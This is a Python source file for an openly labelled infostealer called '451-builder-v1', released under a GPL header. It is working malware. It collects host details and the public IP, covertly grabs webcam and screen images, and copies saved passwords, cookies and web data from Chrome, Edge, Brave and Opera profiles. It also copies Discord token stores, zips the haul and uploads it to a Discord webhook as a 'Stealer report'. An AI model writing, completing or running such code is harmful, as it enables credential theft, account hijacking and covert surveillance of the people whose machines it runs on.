# 451-builder-v1 - Description rapide du programme.
# Copyright (C) 2026 uhqtools-on
# This file is part of 451-builder-v1.
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program. If not, see https://www.gnu.org/licenses/.

import os
import sys
import json
import shutil
import zipfile
import socket
import platform
import subprocess
import tempfile
from datetime import datetime
from pathlib import Path

# ============ CONFIG ============
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXX/YYYY"
# ================================

TEMP = Path(tempfile.gettempdir()) / "stealer_tmp"
TEMP.mkdir(exist_ok=True)

def get_pc_info():
    info = {
        "user": os.getenv("USERNAME") or os.getenv("USER"),
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "system": platform.system(),
        "release": platform.release(),
        "processor": platform.processor(),
        "architecture": platform.machine(),
        "ip_local": socket.gethostbyname(socket.gethostname()),
        "date": datetime.now().isoformat(),
    }
    try:
        import requests
        info["ip_public"] = requests.get("https://api.ipify.org", timeout=5).text
    except Exception:
        info["ip_public"] = "N/A"
    return info

def capture_webcam(path):
    try:
        import cv2
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(str(path), frame)
        cam.release()
    except Exception:
        pass

def capture_screen(path):
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(all_screens=True)
        img.save(path)
    except Exception:
        try:
            from PIL import ImageGrab
            ImageGrab.grab().save(path)
        except Exception:
            pass

def steal_browsers():
    """Chrome, Edge, Brave, Opera - passwords, cookies, tokens"""
    out = TEMP / "browsers"
    out.mkdir(exist_ok=True)

    user = os.getenv("USERNAME") or os.getenv("USER")
    local = Path(f"C:/Users/{user}/AppData/Local")
    roaming = Path(f"C:/Users/{user}/AppData/Roaming")

    targets = {
        "Chrome": local / "Google/Chrome/User Data",
        "Edge": local / "Microsoft/Edge/User Data",
        "Brave": local / "BraveSoftware/Brave-Browser/User Data",
        "Opera": roaming / "Opera Software/Opera Stable",
        "OperaGX": roaming / "Opera Software/Opera GX Stable",
    }

    for name, base in targets.items():
        if not base.exists():
            continue
        dest = out / name
        dest.mkdir(exist_ok=True)
        for profile in base.glob("*"):
            if not profile.is_dir():
                continue
            for f in ["Login Data", "Cookies", "Web Data", "Local State"]:
                src = profile / f
                if src.exists():
                    try:
                        shutil.copy2(src, dest / f"{profile.name}_{f}")
                    except Exception:
                        pass

def steal_discord_tokens():
    """Récupère les tokens Discord depuis Local Storage"""
    user = os.getenv("USERNAME") or os.getenv("USER")
    roaming = Path(f"C:/Users/{user}/AppData/Roaming")
    apps = {
        "discord": roaming / "discord",
        "discordcanary": roaming / "discordcanary",
        "discordptb": roaming / "discordptb",
        "lightcord": roaming / "Lightcord",
    }
    tokens = {}
    for name, base in apps.items():
        ldb = base / "Local Storage/leveldb"
        if not ldb.exists():
            continue
        dest = TEMP / f"{name}_leveldb"
        dest.mkdir(exist_ok=True)
        for f in ldb.glob("*"):
            try:
                shutil.copy2(f, dest / f.name)
            except Exception:
                pass
        tokens[name] = str(dest)
    return tokens

def make_zip(zip_path):
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
        for root, _, files in os.walk(TEMP):
            for f in files:
                p = Path(root) / f
                z.write(p, p.relative_to(TEMP))

def send_webhook(zip_path, info):
    try:
        import requests
        with open(zip_path, "rb") as f:
            payload = {
                "content": f"**Stealer report** — `{info['user']}@{info['hostname']}`\n```json\n{json.dumps(info, indent=2)[:1500]}\n```"
            }
            files = {"file": (zip_path.name, f, "application/zip")}
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=60)
    except Exception as e:
        print("webhook error:", e)

def main():
    info = get_pc_info()
    (TEMP / "info.json").write_text(json.dumps(info, indent=2))
    capture_webcam(TEMP / "webcam.jpg")
    capture_screen(TEMP / "screen.png")
    steal_browsers()
    steal_discord_tokens()

    zip_path = Path(tempfile.gettempdir()) / f"report_{info['hostname']}.zip"
    make_zip(zip_path)
    send_webhook(zip_path, info)

if __name__ == "__main__":
    main()